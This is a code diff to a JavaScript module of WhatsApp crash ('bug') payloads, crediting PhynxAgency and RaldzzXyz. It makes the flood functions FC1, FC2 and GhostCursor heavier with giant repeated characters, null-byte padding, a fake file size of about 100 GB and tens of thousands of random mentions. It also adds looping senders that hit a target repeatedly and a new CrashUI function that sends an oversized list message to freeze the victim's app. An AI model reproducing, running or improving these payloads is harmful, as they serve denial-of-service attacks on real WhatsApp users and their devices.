@@ -965,15 +965,15 @@ async function iOSxPayload(sock, target) {
 async function FC1(sock, target) {
   const cards = [];
   
-  for (let i = 0; i < 20; i++) { 
+  for (let i = 0; i < 999; i++) { 
     cards.push({
       header: {
-        title: 'ꦾ'.repeat(9000),
+        title: 'ꦾ'.repeat(60000),
         imageMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
           mimetype: "image/jpeg",
           fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
-          fileLength: Math.floor(10 * 490).toString(),
+          fileLength: Math.floor(99.99 * 1073741824).toString(),
           height: 1,
           width: 1,
           mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
@@ -987,10 +987,10 @@ async function FC1(sock, target) {
         hasMediaAttachment: true
       },
       body: { 
-        text: "ꦾ".repeat(9000)
+        text: "ꦾ".repeat(60000)
       },
       footer: {
-        text: "ꦾ".repeat(9000)
+        text: "ꦾ".repeat(60000)
       },
       nativeFlowMessage: {
         messageParamsJson: "\u0000".repeat(9999),
@@ -1022,10 +1022,10 @@ async function FC1(sock, target) {
         },
         interactiveMessage: {
           body: { 
-            text: "ꦾ".repeat(9000)
+            text: "ꦾ".repeat(60000)
           },
           footer: { 
-            text: "ꦾ".repeat(9000)
+            text: "ꦾ".repeat(60000)
           },
           carouselMessage: {
             cards: cards 
@@ -1073,7 +1073,7 @@ async function FC2(sock, target) {
   const mentionedList = [
         "696969696969@s.whatsapp.net",
         ...Array.from({ length: 35000 }, () =>
-            `1${Math.floor(Math.random() * 5000)}@s.whatsapp.net`
+            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
         )
     ];
     
@@ -1310,75 +1310,12 @@ async function FC3(sock, target) {
 }
 
 
-// CASE 
-
-/* 
-
-    • Original By PhynxAgency 
-    • Created By RaldzzXyz
-    • t.me/RaldzzXyz
-    • Don't Forget To Combine 1 & 2
-    
-*/
-
-
-async function BB(sock, target) {
-    for (let i = 0; i < 20; i++) {
-        //await AB1(sock, target)
-        B(sock, target)
-        await B(sock, target)
-        console.log(`${i} BB Packet To ${target}`)
-    }
-}
-async function BB1(sock, target) {
-    for (let i = 0; i < 20; i++) {
-        //await AB1(sock, target)
-        B1(sock, target)
-        await B1(sock, target)
-        console.log(`${i} BB1 Packet To ${target}`)
-    }
-}
-async function BG2(sock, target) {
-    for (let i = 0; i < 20; i++) {
-        //await AB1(sock, target)
-        G2(sock, target)
-        await G2(sock, target)
-        console.log(`${i} BG2 Packet To ${target}`)
-    }
-}
-async function BH3(sock, target) {
-    for (let i = 0; i < 20; i++) {
-        //await AB1(sock, target)
-        H3(sock, target)
-        await H3(sock, target)
-        console.log(`${i} BH3 Packet To ${target}`)
-    }
-}
-async function sikat(sock, target) {
-    for (let i = 0; i < 30; i++) {
-        //await AB1(sock, target, true)
-        //await AB2(sock, target, true)
-        await F(sock, target)
-        await FC1(sock, target)
-        console.log(`${i} sikat Packet To ${target}`)
-    }
-}
-async function BFC(sock, target) {
-      for (let i = 0; i < 30; i++) {
-        //await AB1(sock, target, true)
-        //await AB2(sock, target, true)
-        await FC2(sock, target)
-        await FC3(sock, target)
-        console.log(`${i} FC Packet To ${target}`)
-    }
-
-}
-
 async function GhostCursor(sock, target) {
   const mentionedList = [
+        "5521992999999@s.whatsapp.net",
         "696969696969@s.whatsapp.net",
-        ...Array.from({ length: 35000 }, () =>
-            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
+        ...Array.from({ length: 35 * 1000 }, () =>
+            `92${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
         )
     ];
     
@@ -1391,10 +1328,10 @@ async function GhostCursor(sock, target) {
         },
         interactiveMessage: {
           body: { 
-            text: '' 
+            text: '\u0000'.repeat(9999)
           },
           footer: { 
-            text: '' 
+            text: '\u0000'.repeat(9999)
           },
           carouselMessage: {
             cards: [
@@ -1412,7 +1349,7 @@ async function GhostCursor(sock, target) {
                     fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                     directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                     mediaKeyTimestamp: "1749172037",
-                    jpegThumbnail: null,
+                    jpegThumbnail: "PhynxAgency",
                     scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                     scanLengths: [8596, 155493]
                   },
@@ -1425,7 +1362,7 @@ async function GhostCursor(sock, target) {
                   text: "\u0000".repeat(9999)
                 },
                 nativeFlowMessage: {
-                  messageParamsJson: "\n".repeat(10000),
+                  messageParamsJson: "\u0000".repeat(9999),
                   buttons: [
                   {
             name: "single_select",
@@ -1433,9 +1370,21 @@ async function GhostCursor(sock, target) {
               status: true, 
               criador: "PhynxAgency", 
               versao: "@latest", 
-              atualizado: "2025-06-07",  
-              suporte: "https://wa.me/status?video", 
-              comandosDisponiveis: ["awa"], 
+              atualizado: "9999-99-99",  
+              suporte: "https://wa.me/status?photo", 
+              comandosDisponiveis: ["-"], 
+              prefixo: ".", 
+              linguagem: "USA" 
+                            })
+                        },                    {
+            name: "call_permission_request",
+            buttonParamsJson: JSON.stringify({ 
+              status: true, 
+              criador: "PhynxAgency", 
+              versao: "@latest", 
+              atualizado: "9999-99-99",  
+              suporte: "https://wa.me/status?photo", 
+              comandosDisponiveis: ["-"], 
               prefixo: ".", 
               linguagem: "USA" 
                             })
@@ -1449,9 +1398,16 @@ async function GhostCursor(sock, target) {
             participant: target,
             stanzaId: "ABCDEF1234567890",
             mentionedJid: mentionedList,
+            forwardingScore: 9999999,
+            isForwarded: true,
+            forwardedNewsletterMessageInfo:
+            {
+                newsletterName: "ꦾ".repeat(100),
+                newsletterJid: "1@newsletter",
+                serverMessageId: 1
+            },
             quotedMessage: {
-              viewOnceMessage: {
-                message: {
+              viewOnceMessage: {message: {
                   interactiveResponseMessage: {
                     body: {
                       text: "Sent",
@@ -1459,7 +1415,7 @@ async function GhostCursor(sock, target) {
                     },
                     nativeFlowResponseMessage: {
                       name: "call_permission_request",
-                      paramsJson: JSON.stringify({ status: true}),
+                      paramsJson: JSON.stringify({ status: true }),
                       version: 3
                     }
                   }
@@ -1498,6 +1454,94 @@ async function GhostCursor(sock, target) {
   });
 }
 
+/* 
+    • Credits:
+    • Original By PhynxAgency 
+    • Created By RaldzzXyz
+    • t.me/RaldzzXyz
+*/
+
+
+async function BB(sock, target) {
+    for (let i = 0; i < 20; i++) {
+        //await AB1(sock, target)
+        B(sock, target)
+        await B(sock, target)
+        console.log(`${i} BB Packet To ${target}`)
+    }
+}
+async function BB1(sock, target) {
+    for (let i = 0; i < 20; i++) {
+        //await AB1(sock, target)
+        B1(sock, target)
+        await B1(sock, target)
+        console.log(`${i} BB1 Packet To ${target}`)
+    }
+}
+async function BG2(sock, target) {
+    for (let i = 0; i < 20; i++) {
+        //await AB1(sock, target)
+        G2(sock, target)
+        await G2(sock, target)
+        console.log(`${i} BG2 Packet To ${target}`)
+    }
+}
+async function BH3(sock, target) {
+    for (let i = 0; i < 20; i++) {
+        //await AB1(sock, target)
+        H3(sock, target)
+        await H3(sock, target)
+        console.log(`${i} BH3 Packet To ${target}`)
+    }
+}
+async function sikat(sock, target) {
+    for (let i = 0; i < 10; i++) {
+        //await AB1(sock, target, true)
+        //await AB2(sock, target, true)
+        await GhostCursor(sock, target)
+        console.log(`${i} sikat Packet To ${target}`)
+    }
+}
+async function BFC(sock, target) {
+      for (let i = 0; i < 20; i++) {
+        //await AB1(sock, target, true)
+        //await AB2(sock, target, true)
+        //await FC2(sock, target)
+        //await FC3(sock, target)
+          await GhostCursor(sock, target)
+        console.log(`${i} FC Packet To ${target}`)
+    }
+
+}
+
+async function CrashUI(sock, from) {
+  const UICrash = "ꦾ".repeat(166666);
+  await sock.relayMessage(from, {
+    "listMessage": {
+      "title":`${UICrash}`,
+      "description": `${UICrash}`,
+      "listType": 2,
+      "productListInfo": {
+        "productSections": [
+          {
+            "title": "LIST_CATALOG",
+            "products": [
+              { "productId": "000000000000000" },
+              { "productId": "000000000000000" },
+              { "productId": "000000000000000" },
+              { "productId": "000000000000000" }
+            ]
+          }
+        ],
+        "headerImage": {
+          "productId": "0000000000000",
+          "jpegThumbnail": `https://files.catbox.moe/t64p42.jpg`
+        },
+        "businessOwnerJid": "0000000000000@s.whatsapp.net"
+      }
+    }
+  }, { participant: { jid: from }});
+}
 module.exports = {
     A,
     B,
@@ -1515,6 +1559,7 @@ module.exports = {
     AB1,
     AB2,
     BFC,
+    CrashUI,
     GhostCursor,
     ForceCallCrL,
     iOSxContact,
